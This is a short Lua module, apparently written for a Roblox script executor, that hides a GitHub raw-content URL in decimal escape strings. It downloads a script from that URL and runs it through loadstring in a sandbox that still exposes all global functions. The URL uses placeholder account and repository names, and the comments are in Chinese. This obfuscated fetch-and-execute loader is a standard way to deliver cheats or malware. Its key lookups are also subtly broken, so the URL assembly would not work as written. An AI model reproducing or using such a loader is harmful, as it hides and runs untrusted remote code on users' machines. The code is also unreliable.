local function QuantumLoader()
    local urlSegments = {
        [math.pi] = "\104\116\116\112\115\58\47\47",
        [math.huge] = "\114\97\119\46\103\105\116\104",
        [1/0] = "\117\98\117\115\101\114\99\111",
        [math.random()] = "\110\116\101\110\116\46\99\111",
        [os.time()] = "\109\47\89\79\85\82\95\85\83\69\82",
        [tick()] = "\47\89\79\85\82\95\82\69\80\79",
        [wait()] = "\47\109\97\105\110\47\75\84\101\115\116\46\108\117\97"
    }
    
    local urlKey = {"pi","huge","inf",1,2,3,4}
    local fullUrl = ""
    for i,k in ipairs(urlKey) do
        fullUrl = fullUrl..urlSegments[tonumber(k) or _G.math[k]]
    end
    
    -- 获取加密脚本
    local encrypted = (syn and syn.request or http_request or game.HttpGet)({
        Url = fullUrl,
        Method = "GET"
    }).Body
    
    local sandbox = setmetatable({}, {
        __index = function(t,k)
            return (_G[k] and type(_G[k]) == "function" and _G[k] or nil)
        end
    })
    
    -- 执行
    local fn,err = loadstring(encrypted)
    if not fn then error("解密失败: "..tostring(err)) end
    
    setfenv(fn, sandbox)
    return pcall(fn)
end

return QuantumLoader
